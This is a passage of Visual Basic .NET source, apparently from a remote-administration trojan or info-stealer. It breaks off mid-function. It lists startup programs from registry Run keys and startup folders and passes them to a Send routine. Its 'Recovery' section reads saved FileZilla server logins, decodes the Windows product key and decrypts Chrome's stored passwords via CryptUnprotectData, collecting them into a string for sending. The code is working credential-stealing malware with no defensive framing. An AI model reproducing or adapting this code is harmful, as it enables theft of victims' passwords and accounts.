    Dim Dr As String = Environment.GetEnvironmentVariable("SystemDrive")
    Dim Sr As String = Environment.GetEnvironmentVariable("SystemRoot")

    Public Sub SendQuickStartups(ByVal IncludeIcon As Integer)
        On Error Resume Next
        Dim StringsToSend As String = Nothing
        If IncludeIcon = 2 Then

            StringsToSend &= ReturnHKCUStrs("Software\Microsoft\Windows\CurrentVersion\Run", True)
            StringsToSend &= ReturnHKLMStrs("Software\Microsoft\Windows\CurrentVersion\Run", True)
            StringsToSend &= ReturnHKCUStrs("Software\Microsoft\Windows\CurrentVersion\RunOnce", True)
            StringsToSend &= ReturnHKLMStrs("Software\Microsoft\Windows\CurrentVersion\RunOnce", True)
            'StringsToSend &= ReturnHKLMServices("System\CurrentControlSet\Services", True)
            'StringsToSend &= ReturnHKLMStrs("Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run", True)
            StringsToSend &= ReturnDirStrs(Environment.GetFolderPath(Environment.SpecialFolder.Startup), True)
            StringsToSend &= ReturnDirStrs(Environment.GetEnvironmentVariable("SystemDrive") & "\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup", True)

        Else
            StringsToSend &= ReturnHKCUStrs("Software\Microsoft\Windows\CurrentVersion\Run", False)
            StringsToSend &= ReturnHKLMStrs("Software\Microsoft\Windows\CurrentVersion\Run", False)
            StringsToSend &= ReturnHKCUStrs("Software\Microsoft\Windows\CurrentVersion\RunOnce", False)
            StringsToSend &= ReturnHKLMStrs("Software\Microsoft\Windows\CurrentVersion\RunOnce", False)
            'StringsToSend &= ReturnHKLMServices("System\CurrentControlSet\Services", False)
            'StringsToSend &= ReturnHKLMStrs("Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run", False)
            StringsToSend &= ReturnDirStrs(Environment.GetFolderPath(Environment.SpecialFolder.Startup), False)
            StringsToSend &= ReturnDirStrs(Environment.GetEnvironmentVariable("SystemDrive") & "\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup", False)
        End If
        Send(QuickStartups & StringsToSend)
    End Sub

    Public Function ReturnHKLMServices(ByVal key As String, ByVal ExtrIc As Boolean) As String
        On Error Resume Next
        Dim StringsToRet As String = Nothing
        For Each S1 In My.Computer.Registry.LocalMachine.OpenSubKey(key, False).GetSubKeyNames

            Dim EntryName As String = ""
            Dim Location As String = ""

            Dim vals() As String = My.Computer.Registry.LocalMachine.OpenSubKey(key & "\" & S1, False).GetValueNames
            For Each v As String In vals
                If v = "ImagePath" Then
                    EntryName = S1
                    Location = My.Computer.Registry.LocalMachine.OpenSubKey(key & "\" & S1, False).GetValue("ImagePath")
                    If Not Location.Contains(".exe") Then GoTo nextOne
                    If Location.Contains("SystemRoot") Then
                        Location = Location.Replace("SystemRoot", Sr)
                    End If
                    If Location.Contains("%SystemRoot%") Then
                        Location = Location.Replace("%SystemRoot%", Sr)
                    End If
                    If Not Location.Contains(Dr) Then
                        Location = Dr & "\" & Location
                    End If
                End If
            Next

            If EntryName = "" Or Location = "" Then GoTo nextOne
            If Location.Contains(Chr(34)) Then
                Location = Location.Split(Chr(34))(1)
            End If
            If Location.Contains(" -") Then
                Location = Split(Location, " -")(0)
            End If
            If Location.Contains(" /") Then
                Location = Split(Location, " /")(0)
            End If

            If ExtrIc Then
                StringsToRet &= RegKeyId & Split1 & "HKEY_LOCAL_MACHINE\" & key & Split1 & EntryName & Split1 & Location & Split1 & ImageToBase64(ExtractIcon(Location)) & Split2
            Else
                StringsToRet &= RegKeyId & Split1 & "HKEY_LOCAL_MACHINE\" & key & Split1 & EntryName & Split1 & Location & Split1 & Split2
            End If
nextOne:
        Next
        Return StringsToRet
    End Function

    Public Function ReturnHKCUStrs(ByVal key As String, ByVal ExtrIc As Boolean) As String
        On Error Resume Next
        Dim StringsToRet As String = Nothing
        For Each R1 In My.Computer.Registry.CurrentUser.OpenSubKey(key, False).GetValueNames
            Dim rVal As String = My.Computer.Registry.CurrentUser.OpenSubKey(key, False).GetValue(R1)

            If rVal.Contains(Chr(34)) Then
                rVal = rVal.Split(Chr(34))(1)
            End If
            If rVal.Contains(" -") Then
                rVal = Split(rVal, " -")(0)
            End If
            If rVal.Contains(" /") Then
                rVal = Split(rVal, " /")(0)
            End If

            If ExtrIc Then
                StringsToRet &= RegKeyId & Split1 & "HKEY_CURRENT_USER\" & key & Split1 & R1 & Split1 & rVal & Split1 & ImageToBase64(ExtractIcon(rVal)) & Split2
            Else
                StringsToRet &= RegKeyId & Split1 & "HKEY_CURRENT_USER\" & key & Split1 & R1 & Split1 & rVal & Split1 & Split2
            End If

        Next
        Return StringsToRet
    End Function

    Public Function ReturnHKLMStrs(ByVal key As String, ByVal ExtrIc As Boolean) As String
        On Error Resume Next
        Dim StringsToRet As String = Nothing
        For Each R1 In My.Computer.Registry.LocalMachine.OpenSubKey(key, False).GetValueNames
            Dim rVal As String = My.Computer.Registry.LocalMachine.OpenSubKey(key, False).GetValue(R1)

            If rVal.Contains(Chr(34)) Then
                rVal = rVal.Split(Chr(34))(1)
            End If
            If rVal.Contains(" -") Then
                rVal = Split(rVal, " -")(0)
            End If
            If rVal.Contains(" /") Then
                rVal = Split(rVal, " /")(0)
            End If

            If ExtrIc Then
                StringsToRet &= RegKeyId & Split1 & "HKEY_LOCAL_MACHINE\" & key & Split1 & R1 & Split1 & rVal & Split1 & ImageToBase64(ExtractIcon(rVal)) & Split2
            Else
                StringsToRet &= RegKeyId & Split1 & "HKEY_LOCAL_MACHINE\" & key & Split1 & R1 & Split1 & rVal & Split1 & Split2
            End If
        Next
        Return StringsToRet
    End Function
    Public Function ReturnDirStrs(ByVal path As String, ByVal ExtrIc As Boolean) As String
        On Error Resume Next
        Dim StringsToRet As String = Nothing
        For Each f As IO.FileInfo In New IO.DirectoryInfo(path).GetFiles
            If ExtrIc Then
                StringsToRet &= FolderId & Split1 & path & Split1 & f.Name & Split1 & f.FullName & Split1 & ImageToBase64(ExtractIcon(f.FullName)) & Split2
            Else
                StringsToRet &= FolderId & Split1 & path & Split1 & f.Name & Split1 & f.FullName & Split1 & Split2
            End If

        Next
        Return StringsToRet
    End Function
    Public Function ExtractIcon(ByVal file As String) As Image

        Try

            Return Icon.ExtractAssociatedIcon(file).ToBitmap
        Catch
            Return Nothing
        End Try
    End Function

    Public Function ImageToBase64(ByVal Img As Image) As String

        Try
            If Not Img Is Nothing Then
                Using M As New IO.MemoryStream
                    Img.Save(M, Imaging.ImageFormat.Png)
                    ImageToBase64 = Convert.ToBase64String(M.GetBuffer)
                    M.Close()
                    M.Dispose()
                End Using
            Else
                ImageToBase64 = Nothing
            End If
        Catch
            Return Nothing
        End Try
    End Function
End Class
#End Region

#Region " Recovery "

Class Recovery
    Public Function getPasswords() As String
        Try
            Dim passwordList As String = WinKey & ReadFileZilla() & GetChromePasswords()
            Return passwordList
        Catch ex As Exception
            Return Chr(4) & SplitMark1 & "Error: " & ex.ToString & SplitMark1 & "Null" & SplitMark1 & "Null" & SplitMark1 & "Null" & splitMark2
        End Try
    End Function

#Region "Filezilla"

    Public Function ReadFileZilla() As String
        On Error Resume Next
        Dim XMLDOC As New Xml.XmlDocument
        XMLDOC.Load(Environ("AppData") & "\FileZilla\recentservers.xml")
        Dim XMLPath As Xml.XmlElement
        XMLPath = XMLDOC.SelectSingleNode("//Server")
        Dim Servers As Integer
        Servers = XMLDOC.GetElementsByTagName("Server").Count
        Dim i As Integer = 0
        Dim Output As String = ""
        Do Until i = Servers
            i += 1
            Output += Chr(2) & SplitMark1 & XMLPath.Item("Host").InnerText & SplitMark1 & XMLPath.Item("User").InnerText & SplitMark1 & XMLPath.Item("Pass").InnerText & splitMark2
            If i < Servers Then
                XMLPath = XMLDOC.SelectSingleNode("//Server").NextSibling
            End If
        Loop
        Return Output
    End Function

#End Region

#Region "Windows key"
    Public ReadOnly Property WinKey() As String
        Get
            Try
                Dim rKey As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows NT\CurrentVersion")
                Dim rpk As Byte() = rKey.GetValue("DigitalProductId", 0)
                Dim strKey As String = ""
                Const iRPKOffset As Integer = 52
                Const strPossibleChars As String = "BCDFGHJKMPQRTVWXY2346789"
                Dim i As Integer = 28
                Do
                    Dim lAccu As Long = 0
                    Dim j As Integer = 14
                    Do
                        lAccu *= 256
                        lAccu += Convert.ToInt64(rpk(iRPKOffset + j))
                        rpk(iRPKOffset + j) = Convert.ToByte(Convert.ToInt64(Math.Floor(CSng(lAccu) / 24.0F)) And Convert.ToInt64(255))
                        lAccu = lAccu Mod 24
                        j -= 1
                    Loop While j >= 0
                    i -= 1
                    strKey = strPossibleChars(CInt(lAccu)).ToString() + strKey
                    If (0 = ((29 - i) Mod 6)) AndAlso (-1 <> i) Then
                        i -= 1
                        strKey = "-" + strKey
                    End If
                Loop While i >= 0
                '    "Google ChromeMainModule.SplitMark1" & host & MainModule.SplitMark1 & user & MainModule.SplitMark1 & pass & "%"
                Return Chr(3) & MainModule.SplitMark1 & strKey & MainModule.SplitMark1 & "Null" & MainModule.SplitMark1 & "Null" & MainModule.splitMark2
            Catch ex As Exception
                Return Nothing
            End Try
        End Get
    End Property
#End Region

End Class

#Region "Sbase"
Public Class SBase
    <DllImport("kernel32")> Private Shared Function HeapAlloc(ByVal heap As IntPtr, ByVal flags As UInt32, ByVal bytes As UInt32) As IntPtr
    End Function

    <DllImport("kernel32")> Private Shared Function GetProcessHeap() As IntPtr
    End Function

    <DllImport("kernel32")> Private Shared Function lstrlen(ByVal str As IntPtr) As Integer
    End Function

    <DllImport("sqlite3")> Private Shared Function sqlite3_open(ByVal fileName As IntPtr, ByRef database As IntPtr) As Integer
    End Function

    <DllImport("sqlite3")> Private Shared Function sqlite3_close(ByVal database As IntPtr) As Integer
    End Function

    <DllImport("sqlite3")> Private Shared Function sqlite3_exec(ByVal database As IntPtr, ByVal query As IntPtr, ByVal callback As IntPtr, ByVal arguments As IntPtr, ByRef [error] As IntPtr) As Integer
    End Function

    <DllImport("sqlite3")> Private Shared Function sqlite3_prepare_v2(ByVal database As IntPtr, ByVal query As IntPtr, ByVal length As Integer, ByRef statement As IntPtr, ByRef tail As IntPtr) As Integer
    End Function

    <DllImport("sqlite3")> Private Shared Function sqlite3_step(ByVal statement As IntPtr) As Integer
    End Function

    <DllImport("sqlite3")> Private Shared Function sqlite3_column_count(ByVal statement As IntPtr) As Integer
    End Function

    <DllImport("sqlite3")> Private Shared Function sqlite3_column_name(ByVal statement As IntPtr, ByVal columnNumber As Integer) As IntPtr
    End Function

    <DllImport("sqlite3")> Private Shared Function sqlite3_column_type(ByVal statement As IntPtr, ByVal columnNumber As Integer) As Integer
    End Function

    <DllImport("sqlite3")> Private Shared Function sqlite3_column_int(ByVal statement As IntPtr, ByVal columnNumber As Integer) As Integer
    End Function

    <DllImport("sqlite3")> Private Shared Function sqlite3_column_double(ByVal statement As IntPtr, ByVal columnNumber As Integer) As Double
    End Function

    <DllImport("sqlite3")> Private Shared Function sqlite3_column_text(ByVal statement As IntPtr, ByVal columnNumber As Integer) As IntPtr
    End Function

    <DllImport("sqlite3")> Private Shared Function sqlite3_column_blob(ByVal statement As IntPtr, ByVal columnNumber As Integer) As IntPtr
    End Function

    <DllImport("sqlite3")> Private Shared Function sqlite3_column_table_name(ByVal statement As IntPtr, ByVal columnNumber As Integer) As IntPtr
    End Function

    <DllImport("sqlite3")> Private Shared Function sqlite3_finalize(ByVal handle As IntPtr) As Integer
    End Function

    Private Const SQL_OK As Integer = 0
    Private Const SQL_ROW As Integer = 100
    Private Const SQL_DONE As Integer = 101
    Public Enum SQLiteDataTypes
        INT = 1
        FLOAT
        TEXT
        BLOB
        NULL
    End Enum
    Private database As IntPtr
    Public Sub New()
        On Error Resume Next
        database = IntPtr.Zero
    End Sub
    Public Sub New(ByVal baseName As [String])
        On Error Resume Next
        OpenDatabase(baseName)
    End Sub
    Public Sub OpenDatabase(ByVal baseName As [String])
        On Error Resume Next
        If sqlite3_open(StringToPointer(baseName), database) <> SQL_OK Then
            database = IntPtr.Zero
        End If
    End Sub
    Public Sub CloseDatabase()
        On Error Resume Next
        If database <> IntPtr.Zero Then
            sqlite3_close(database)
        End If
    End Sub
    Public Function GetTables() As ArrayList
        On Error Resume Next
        Const query As String = "SELECT name FROM sqlite_master " & "WHERE type IN ('table','view') AND name NOT LIKE 'sqlite_%'" & "UNION ALL " & "SELECT name FROM sqlite_temp_master " & "WHERE type IN ('table','view') " & "ORDER BY 1"
        Dim table As DataTable = ExecuteQuery(query)
        Dim list As New ArrayList()
        For Each row As DataRow In table.Rows
            list.Add(row.ItemArray(0).ToString())
        Next
        Return list
    End Function
    Public Sub ExecuteNonQuery(ByVal query As [String])
        On Error Resume Next
        Dim [error] As IntPtr
        sqlite3_exec(database, StringToPointer(query), IntPtr.Zero, IntPtr.Zero, [error])
        If [error] <> IntPtr.Zero Then
        End If
    End Sub
    Public Function ExecuteQuery(ByVal query As [String]) As DataTable
        On Error Resume Next
        Dim statement As IntPtr
        Dim excessData As IntPtr
        sqlite3_prepare_v2(database, StringToPointer(query), GetPointerLenght(StringToPointer(query)), statement, excessData)
        Dim table As New DataTable()
        Dim result As Integer = ReadFirstRow(statement, table)
        While result = SQL_ROW
            result = ReadNextRow(statement, table)
        End While
        sqlite3_finalize(statement)
        Return table
    End Function
    Private Function ReadFirstRow(ByVal statement As IntPtr, ByRef table As DataTable) As Integer
        On Error Resume Next
        table = New DataTable("resultTable")
        Dim resultType As Integer = sqlite3_step(statement)
        If resultType = SQL_ROW Then
            Dim columnCount As Integer = sqlite3_column_count(statement)
            Dim columnName As [String] = ""
            Dim columnType As Integer = 0
            Dim columnValues As Object() = New Object(columnCount - 1) {}
            For i As Integer = 0 To columnCount - 1
                columnName = PointerToString(sqlite3_column_name(statement, i))
                columnType = sqlite3_column_type(statement, i)
                Select Case columnType
                    Case CInt(SQLiteDataTypes.INT)
                        If True Then
                            table.Columns.Add(columnName, Type.[GetType]("System.Int32"))
                            columnValues(i) = sqlite3_column_int(statement, i)
                            Exit Select
                        End If
                    Case CInt(SQLiteDataTypes.FLOAT)
                        If True Then
                            table.Columns.Add(columnName, Type.[GetType]("System.Single"))
                            columnValues(i) = sqlite3_column_double(statement, i)
                            Exit Select
                        End If
                    Case CInt(SQLiteDataTypes.TEXT)
                        If True Then
                            table.Columns.Add(columnName, Type.[GetType]("System.String"))
                            columnValues(i) = PointerToString(sqlite3_column_text(statement, i))
                            Exit Select
                        End If
                    Case CInt(SQLiteDataTypes.BLOB)
                        If True Then
                            table.Columns.Add(columnName, Type.[GetType]("System.String"))
                            columnValues(i) = PointerToString(sqlite3_column_blob(statement, i))
                            Exit Select
                        End If
                    Case Else
                        If True Then
                            table.Columns.Add(columnName, Type.[GetType]("System.String"))
                            columnValues(i) = ""
                            Exit Select
                        End If
                End Select
            Next
            table.Rows.Add(columnValues)
        End If
        Return sqlite3_step(statement)
    End Function
    Private Function ReadNextRow(ByVal statement As IntPtr, ByRef table As DataTable) As Integer

        On Error Resume Next
        Dim columnCount As Integer = sqlite3_column_count(statement)

        Dim columnType As Integer = 0
        Dim columnValues As Object() = New Object(columnCount - 1) {}

        For i As Integer = 0 To columnCount - 1
            columnType = sqlite3_column_type(statement, i)

            Select Case columnType
                Case CInt(SQLiteDataTypes.INT)
                    If True Then
                        columnValues(i) = sqlite3_column_int(statement, i)
                        Exit Select
                    End If
                Case CInt(SQLiteDataTypes.FLOAT)
                    If True Then
                        columnValues(i) = sqlite3_column_double(statement, i)
                        Exit Select
                    End If
                Case CInt(SQLiteDataTypes.TEXT)
                    If True Then
                        columnValues(i) = PointerToString(sqlite3_column_text(statement, i))
                        Exit Select
                    End If
                Case CInt(SQLiteDataTypes.BLOB)
                    If True Then
                        columnValues(i) = PointerToString(sqlite3_column_blob(statement, i))
                        Exit Select
                    End If
                Case Else
                    If True Then
                        columnValues(i) = ""
                        Exit Select
                    End If
            End Select
        Next
        table.Rows.Add(columnValues)
        Return sqlite3_step(statement)
    End Function
    Private Function StringToPointer(ByVal str As [String]) As IntPtr
        On Error Resume Next
        If str Is Nothing Then
            Return IntPtr.Zero
        Else
            Dim encoding__1 As Encoding = Encoding.UTF8
            Dim bytes As [Byte]() = encoding__1.GetBytes(str)
            Dim length As UInteger = bytes.Length + 1
            Dim pointer As IntPtr = HeapAlloc(GetProcessHeap(), 0, length)
            Marshal.Copy(bytes, 0, pointer, bytes.Length)
            Marshal.WriteByte(pointer, bytes.Length, 0)
            Return pointer
        End If
    End Function
    Private Function PointerToString(ByVal ptr As IntPtr) As [String]
        On Error Resume Next
        If ptr = IntPtr.Zero Then
            Return Nothing
        End If

        Dim encoding__1 As Encoding = Encoding.UTF8

        Dim length As Integer = GetPointerLenght(ptr)
        Dim bytes As [Byte]() = New [Byte](length - 1) {}
        Marshal.Copy(ptr, bytes, 0, length)
        Return encoding__1.GetString(bytes, 0, length)
    End Function
    Private Function GetPointerLenght(ByVal ptr As IntPtr) As Integer
        On Error Resume Next
        If ptr = IntPtr.Zero Then
            Return 0
        End If
        Return lstrlen(ptr)
    End Function
End Class

#End Region

#Region "Chrome"

Module CC
    Public temporaryPasswords As String
    Public Function GetChromePasswords() As String
        On Error Resume Next
        Dim info As String = Nothing
        Dim datapath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\Google\Chrome\User Data\Default\Login Data"
        Dim SQLDatabase As Slite = New Slite(datapath)
        SQLDatabase.ReadTable("logins")
        If File.Exists(datapath) Then
            Dim host, user, pass As String
            For i = 0 To SQLDatabase.GetRowCount() - 1 Step 1
                host = SQLDatabase.GetValue(i, "origin_url")
                user = SQLDatabase.GetValue(i, "username_value")
                pass = Decrypt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")))
                If (user <> "") Then
                    temporaryPasswords = (Chr(1) & SplitMark1 & host & SplitMark1 & user & SplitMark1 & pass & splitMark2)
                    info += temporaryPasswords
                End If
            Next
        End If
        Return info
    End Function
    <DllImport("Crypt32.dll", SetLastError:=True, CharSet:=System.Runtime.InteropServices.CharSet.Auto)> _
    Private Function CryptUnprotectData(ByRef pDataIn As DATA_BLOB, ByVal szDataDescr As String, ByRef pOptionalEntropy As DATA_BLOB, ByVal pvReserved As IntPtr, ByRef pPromptStruct As CRYPTPROTECT_PROMPTSTRUCT, ByVal dwFlags As Integer, ByRef pDataOut As DATA_BLOB) As Boolean
    End Function
    <Flags()> Enum CryptProtectPromptFlags
        CRYPTPROTECT_PROMPT_ON_UNPROTECT = &H1
        CRYPTPROTECT_PROMPT_ON_PROTECT = &H2
    End Enum
    <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)> Structure CRYPTPROTECT_PROMPTSTRUCT
        Public cbSize As Integer
        Public dwPromptFlags As CryptProtectPromptFlags
        Public hwndApp As IntPtr
        Public szPrompt As String
    End Structure
    <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)> Structure DATA_BLOB
        Public cbData As Integer
        Public pbData As IntPtr
    End Structure
    Function Decrypt(ByVal Datas() As Byte) As String
        On Error Resume Next
        Dim inj, Ors As New DATA_BLOB
        Dim Ghandle As GCHandle = GCHandle.Alloc(Datas, GCHandleType.Pinned)
        inj.pbData = Ghandle.AddrOfPinnedObject()
        inj.cbData = Datas.Length
        Ghandle.Free()
        CryptUnprotectData(inj, Nothing, Nothing, Nothing, Nothing, 0, Ors)
        Dim Returned() As Byte = New Byte(Ors.cbData) {}
        Marshal.Copy(Ors.pbData, Returned, 0, Ors.cbData)
        Dim TheString As String = Encoding.Default.GetString(Returned)
        Return TheString.Substring(0, TheString.Length - 1)
    End Function
End Module
#End Region

#Region "SQL lite class"
Class Slite

    Private db_bytes() As Byte
    Private page_size As UInt16
    Private encoding As UInt64
    Private master_table_entries() As sqlite_master_entry

    Private SQLDataTypeSize() As Byte = New Byte() {0, 1, 2, 3, 4, 6, 8, 8, 0, 0}
    Private table_entries() As table_entry
    Private field_names() As String

    Private Structure record_header_field
        Dim size As Int64
        Dim type As Int64
    End Structure

    Private Structure table_entry
        Dim row_id As Int64
        Dim content() As String
    End Structure

    Private Structure sqlite_master_entry
        Dim row_id As Int64
        Dim item_type As String
        Dim item_name As String
        Dim astable_name As String
        Dim root_num As Int64
        Dim sql_statement As String
    End Structure

    Private Function GVL(ByVal startIndex As Integer) As Integer
        On Error Resume Next
        If startIndex > db_bytes.Length Then Return Nothing

        For i = startIndex To startIndex + 8 Step 1
            If i > db_bytes.Length - 1 Then
                Return Nothing
            ElseIf (db_bytes(i) And &H80) <> &H80 Then
                Return i
            End If
        Next

        Return startIndex + 8
    End Function

    Private Function CVL(ByVal startIndex As Integer, ByVal endIndex As Integer) As Int64
        On Error Resume Next
        endIndex = endIndex + 1

        Dim retus(7) As Byte
        Dim Length As Integer = endIndex - startIndex
        Dim Bit64 As Boolean = False

        If Length = 0 Or Length > 9 Then Return Nothing
        If Length = 1 Then
            retus(0) = (db_bytes(startIndex) And &H7F)
            Return BitConverter.ToInt64(retus, 0)
        End If

        If Length = 9 Then

            Bit64 = True
        End If

        Dim j As Integer = 1
        Dim k As Integer = 7
        Dim y As Integer = 0

        If Bit64 Then
            retus(0) = db_bytes(endIndex - 1)
            endIndex = endIndex - 1
            y = 1
        End If

        For i = (endIndex - 1) To startIndex Step -1
            If (i - 1) >= startIndex Then
                retus(y) = ((db_bytes(i) >> (j - 1)) And (&HFF >> j)) Or (db_bytes(i - 1) << k)
                j = j + 1
                y = y + 1
                k = k - 1
            Else
                If Not Bit64 Then retus(y) = ((db_bytes(i) >> (j - 1)) And (&HFF >> j))
            End If
        Next

        Return BitConverter.ToInt64(retus, 0)
    End Function

    Private Function IsOdd(ByVal value As Int64) As Boolean
        On Error Resume Next
        Return (value And 1) = 1
    End Function

    Private Function ConvertToInteger(ByVal startIndex As Integer, ByVal Size As Integer) As UInt64
        On Error Resume Next

        If Size > 8 Or Size = 0 Then Return Nothing

        Dim retVal As UInt64 = 0

        For i = 0 To Size - 1 Step 1
            retVal = ((retVal << 8) Or db_bytes(startIndex + i))
        Next

        Return retVal
    End Function

    Private Sub ReadMasterTable(ByVal Offset As UInt64)
        On Error Resume Next
        If db_bytes(Offset) = &HD Then

            Dim Length As UInt16 = ConvertToInteger(Offset + 3, 2) - 1
            Dim ol As Integer = 0

            If Not master_table_entries Is Nothing Then
                ol = master_table_entries.Length
                ReDim Preserve master_table_entries(master_table_entries.Length + Length)
            Else
                ReDim master_table_entries(Length)
            End If

            Dim ent_offset As UInt64

            For i = 0 To Length Step 1
                ent_offset = ConvertToInteger(Offset + 8 + (i * 2), 2)

                If Offset <> 100 Then ent_offset = ent_offset + Offset

                Dim t As Integer = GVL(ent_offset)
                Dim size As Int64 = CVL(ent_offset, t)

                Dim s As Integer = GVL(ent_offset + (t - ent_offset) + 1)
                master_table_entries(ol + i).row_id = CVL(ent_offset + (t - ent_offset) + 1, s)

                ent_offset = ent_offset + (s - ent_offset) + 1

                t = GVL(ent_offset)
                s = t
                Dim Rec_Header_Size As Int64 = CVL(ent_offset, t)

                Dim Field_Size(4) As Int64

                For j As Integer = 0 To 4 Step 1
                    t = s + 1
                    s = GVL(t)
                    Field_Size(j) = CVL(t, s)

                    If Field_Size(j) > 9 Then
                        If IsOdd(Field_Size(j)) Then
                            Field_Size(j) = (Field_Size(j) - 13) / 2
                        Else
                            Field_Size(j) = (Field_Size(j) - 12) / 2
                        End If
                    Else
                        Field_Size(j) = SQLDataTypeSize(Field_Size(j))
                    End If
                Next

                If encoding = 1 Then
                    master_table_entries(ol + i).item_type = System.Text.Encoding.Default.GetString(db_bytes, ent_offset + Rec_Header_Size, Field_Size(0))
                ElseIf encoding = 2 Then
                    master_table_entries(ol + i).item_type = System.Text.Encoding.Unicode.GetString(db_bytes, ent_offset + Rec_Header_Size, Field_Size(0))
                ElseIf encoding = 3 Then
                    master_table_entries(ol + i).item_type = System.Text.Encoding.BigEndianUnicode.GetString(db_bytes, ent_offset + Rec_Header_Size, Field_Size(0))
                End If
                If encoding = 1 Then
                    master_table_entries(ol + i).item_name = System.Text.Encoding.Default.GetString(db_bytes, ent_offset + Rec_Header_Size + Field_Size(0), Field_Size(1))
                ElseIf encoding = 2 Then
                    master_table_entries(ol + i).item_name = System.Text.Encoding.Unicode.GetString(db_bytes, ent_offset + Rec_Header_Size + Field_Size(0), Field_Size(1))
                ElseIf encoding = 3 Then
                    master_table_entries(ol + i).item_name = System.Text.Encoding.BigEndianUnicode.GetString(db_bytes, ent_offset + Rec_Header_Size + Field_Size(0), Field_Size(1))
                End If
                'master_table_entries(ol + i).astable_name = System.Text.Encoding.Default.GetString(db_bytes, ent_offset + Rec_Header_Size + Field_Size(0) + Field_Size(1), Field_Size(2))
                master_table_entries(ol + i).root_num = ConvertToInteger(ent_offset + Rec_Header_Size + Field_Size(0) + Field_Size(1) + Field_Size(2), Field_Size(3))
                If encoding = 1 Then
                    master_table_entries(ol + i).sql_statement = System.Text.Encoding.Default.GetString(db_bytes, ent_offset + Rec_Header_Size + Field_Size(0) + Field_Size(1) + Field_Size(2) + Field_Size(3), Field_Size(4))
                ElseIf encoding = 2 Then
                    master_table_entries(ol + i).sql_statement = System.Text.Encoding.Unicode.GetString(db_bytes, ent_offset + Rec_Header_Size + Field_Size(0) + Field_Size(1) + Field_Size(2) + Field_Size(3), Field_Size(4))
                ElseIf encoding = 3 Then
                    master_table_entries(ol + i).sql_statement = System.Text.Encoding.BigEndianUnicode.GetString(db_bytes, ent_offset + Rec_Header_Size + Field_Size(0) + Field_Size(1) + Field_Size(2) + Field_Size(3), Field_Size(4))
                End If
            Next
        ElseIf db_bytes(Offset) = &H5 Then
            Dim Length As UInt16 = ConvertToInteger(Offset + 3, 2) - 1
            Dim ent_offset As UInt16

            For i = 0 To Length Step 1
                ent_offset = ConvertToInteger(Offset + 12 + (i * 2), 2)

                If Offset = 100 Then
                    ReadMasterTable((ConvertToInteger(ent_offset, 4) - 1) * page_size)
                Else
                    ReadMasterTable((ConvertToInteger(Offset + ent_offset, 4) - 1) * page_size)
                End If

            Next

            ReadMasterTable((ConvertToInteger(Offset + 8, 4) - 1) * page_size)
        End If
    End Sub

    Private Function ReadTableFromOffset(ByVal Offset As UInt64) As Boolean
        On Error Resume Next
        If db_bytes(Offset) = &HD Then

            Dim Length As UInt16 = ConvertToInteger(Offset + 3, 2) - 1
            Dim ol As Integer = 0

            If Not table_entries Is Nothing Then
                ol = table_entries.Length
                ReDim Preserve table_entries(table_entries.Length + Length)
            Else
                ReDim table_entries(Length)
            End If

            Dim ent_offset As UInt64

            For i = 0 To Length Step 1
                ent_offset = ConvertToInteger(Offset + 8 + (i * 2), 2)

                If Offset <> 100 Then ent_offset = ent_offset + Offset

                Dim t = GVL(ent_offset)
                Dim size As Int64 = CVL(ent_offset, t)

                Dim s As Integer = GVL(ent_offset + (t - ent_offset) + 1)
                table_entries(ol + i).row_id = CVL(ent_offset + (t - ent_offset) + 1, s)

                ent_offset = ent_offset + (s - ent_offset) + 1

                t = GVL(ent_offset)
                s = t
                Dim Rec_Header_Size As Int64 = CVL(ent_offset, t)

                Dim Field_Size() As record_header_field
                Dim size_read As Int64 = (ent_offset - t) + 1
                Dim j As Integer = 0

                While size_read < Rec_Header_Size
                    ReDim Preserve Field_Size(j)

                    t = s + 1
                    s = GVL(t)
                    Field_Size(j).type = CVL(t, s)

                    If Field_Size(j).type > 9 Then
                        If IsOdd(Field_Size(j).type) Then
                            Field_Size(j).size = (Field_Size(j).type - 13) / 2
                        Else
                            Field_Size(j).size = (Field_Size(j).type - 12) / 2
                        End If
                    Else
                        Field_Size(j).size = SQLDataTypeSize(Field_Size(j).type)
                    End If

                    size_read = size_read + (s - t) + 1
                    j = j + 1
                End While

                ReDim table_entries(ol + i).content(Field_Size.Length - 1)
                Dim counter As Integer = 0

                For k = 0 To Field_Size.Length - 1 Step 1
                    If Field_Size(k).type > 9 Then
                        If Not IsOdd(Field_Size(k).type) Then
                            If encoding = 1 Then
                                table_entries(ol + i).content(k) = System.Text.Encoding.Default.GetString(db_bytes, ent_offset + Rec_Header_Size + counter, Field_Size(k).size)
                            ElseIf encoding = 2 Then
                                table_entries(ol + i).content(k) = System.Text.Encoding.Unicode.GetString(db_bytes, ent_offset + Rec_Header_Size + counter, Field_Size(k).size)
                            ElseIf encoding = 3 Then
                                table_entries(ol + i).content(k) = System.Text.Encoding.BigEndianUnicode.GetString(db_bytes, ent_offset + Rec_Header_Size + counter, Field_Size(k).size)
                            End If
                        Else
                            table_entries(ol + i).content(k) = System.Text.Encoding.Default.GetString(db_bytes, ent_offset + Rec_Header_Size + counter, Field_Size(k).size)
                        End If
                    Else
                        table_entries(ol + i).content(k) = CStr(ConvertToInteger(ent_offset + Rec_Header_Size + counter, Field_Size(k).size))
                    End If

                    counter = counter + Field_Size(k).size
                Next
            Next
        ElseIf db_bytes(Offset) = &H5 Then
            Dim Length As UInt16 = ConvertToInteger(Offset + 3, 2) - 1
            Dim ent_offset As UInt16

            For i = 0 To Length Step 1
                ent_offset = ConvertToInteger(Offset + 12 + (i * 2), 2)

                ReadTableFromOffset((ConvertToInteger(Offset + ent_offset, 4) - 1) * page_size)
            Next

            ReadTableFromOffset((ConvertToInteger(Offset + 8, 4) - 1) * page_size)
        End If

        Return True
    End Function

    Public Function ReadTable(ByVal TableName As String) As Boolean
        On Error Resume Next
        Dim found As Integer = -1

        For i = 0 To master_table_entries.Length Step 1
            If System.String.Compare(master_table_entries(i).item_name.ToLower(), TableName.ToLower(), StringComparison.Ordinal) = 0 Then
                found = i
                Exit For
            End If
        Next
        If found = -1 Then Return False
